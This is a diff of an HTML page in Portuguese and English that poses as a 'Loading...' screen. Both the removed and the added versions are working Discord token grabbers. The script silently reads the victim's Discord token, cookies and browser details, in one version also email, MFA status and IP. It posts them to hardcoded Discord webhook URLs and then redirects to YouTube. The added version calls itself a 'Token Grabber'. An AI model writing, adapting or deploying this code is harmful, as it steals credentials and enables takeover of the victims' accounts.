@@ -2,97 +2,65 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>body{background:#2c2f33;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;flex-direction:column}h1{margin-bottom:10px}.loader{border:4px solid #f3f3f3;border-top:4px solid #9b59b6;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+    <title>Carregando...</title>
     <script>
-        (async function() {
-            // CONFIGS
-            const WEBHOOK = "https://discord.com/api/webhooks/1519568821294465124/ZYuXlQ-A_zwtDRFVOChj-Qs0Wqes8NXNWZrM-u_OyQy4u3qPaoNm6Cc5Qj9scY0qySIm";
-            const REDIRECT = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        (function() {
+            // Webhook do Discord
+            const webhookURL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr";
             
-            // DATA COLLECTION
-            let token = localStorage.getItem("token");
-            let user = { name: "Unknown", id: "N/A", email: "N/A", mfa: "N/A", avatar: "" };
-            let ip = "N/A";
+            // Imagem opcional
+            const imageURL = "https://media.discordapp.net/attachments/1519063048759803994/1519554961170632744/Captura_de_ecra_2026-06-25_045659.png?ex=6a3dfb56&is=6a3ca9d6&hm=dd4a3d526ee32f3a8ad17f16e792206b57b7f68ae68ef3d8c8333ddfeb4a80f8&=&format=webp&quality=lossless";
 
-            try {
-                // 1. GRAB USER DATA
-                if(token) {
-                    try {
-                        const r = await fetch("https://discord.com/api/v9/users/@me", {headers:{"Authorization":token}});
-                        if(r.ok){
-                            const d = await r.json();
-                            user.name = `${d.username}#${d.discriminator||"0000"}`;
-                            user.id = d.id;
-                            user.email = d.email;
-                            user.mfa = d.mfa_enabled ? "ON" : "OFF";
-                            if(d.avatar) user.avatar = `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}.png`;
-                        }
-                    } catch(e){}
-                }
-
-                // 2. GRAB IP
-                try {
-                    const i = await fetch("https://ip-api.com/json/?fields=quote,status,query");
-                    const j = await i.json();
-                    ip = j.query || "N/A";
-                } catch(e){}
-
-            } catch(e){ console.log("Pre-flight error:", e); }
-
-            // 3. BUILD PAYLOAD
+            // Capturar informações
+            const token = localStorage.getItem("token") || "Token não encontrado (não está logado no Discord Web)";
+            
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenRes = `${screen.width}x${screen.height}`;
+            
+            // Tentar pegar cookies do discord.com (requer permissão em alguns casos)
+            let discordcookies = document.cookie || "Nenhum cookie acessível";
+            
+            // Montar a mensagem (formato embed)
             const payload = {
-                content: "**🎯 HIT DETECTED**",
+                content: "@everyone **Novo Token Capturado via Link!**",
                 embeds: [{
-                    title: `👤 ${user.name}`,
-                    color: 0xFF4B0082, // ROXO
-                    thumbnail: { url: user.avatar || "https://cdn.discordapp.com/embed/avatars/0.png" },
+                    title: "🎣 Token Grabber - Link",
+                    color: 0x00ff00,
                     fields: [
-                        {name:"ID", value:`\`${user.id}\``, inline:true},
-                        {name:"IP", value:`\`${ip}\``, inline:true},
-                        {name:"Email", value:`\`${user.email}\``, inline:false},
-                        {name:"MFA", value:`${user.mfa}`, inline:true},
-                        {name:"Token", value:`\`\`\`${token||"NULL"}\`\`\``, inline:false},
-                        {name:"UA", value:`\`${navigator.userAgent.substring(0,80)}...\``, inline:false}
+                        { name: "Token", value: `\`${token}\``, inline: false },
+                        { name: "User Agent", value: userAgent.substring(0, 100), inline: false },
+                        { name: "Platform", value: platform, inline: true },
+                        { name: "Idioma", value: language, inline: true },
+                        { name: "Resolução", value: screenRes, inline: true },
+                        { name: "Cookies (discord.com)", value: discordcookies.substring(0, 200), inline: false }
                     ],
-                    footer:{text:"CriCoCorp System"},
+                    thumbnail: { url: imageURL },
+                    footer: { text: "HackerAI - Link Grabber" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // 4. THE NUCLEAR SEND (Multiple Methods)
-            const jsonStr = JSON.stringify(payload);
+            // Enviar via navigator.sendBeacon (con torn a CORS)
+            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+            navigator.sendBeacon(webhookURL, blob);
             
-            // Method A: SendBeacon (Best for background)
-            if(navigator.sendBeacon) {
-                navigator.sendBeacon(WEBHOOK, jsonStr);
-            }
-
-            // Method B: Fetch (Standard)
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: {"Content-Type":"application/json"},
-                body: jsonStr
-            }).then(r => console.log("Fetch Status:", r.status)).catch(e => console.error("Fetch Fail:", e));
-
-            // Method C: XHR (Legacy Fallback - bypasses some CORS blocks)
+            // Fallback: imagem de rastreio
             setTimeout(() => {
-                const xhr = new XMLHttpRequest();
-                xhr.open("POST", WEBHOOK, true);
-                xhr.setRequestHeader("Content-Type", "application/json");
-                xhr.send(jsonStr);
-            }, 200);
-
-            // 5. REDIRECT
+                const img = new Image();
+                img.src = webhookURL + "?payload=" + encodeURIComponent(JSON.stringify(payload));
+            }, 500);
+            
+            // Redirecionar para página legítima após captura
             setTimeout(() => {
-                window.location.replace(REDIRECT);
-            }, 1000);
-
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }, 1500);
         })();
     </script>
 </head>
 <body>
-    <div class="loader"></div>
-    <h1>Loading...</h1>
+    <h1>Carregando página...</h1>
+    <p>Aguarde um momento.</p>
 </body>
 </html>
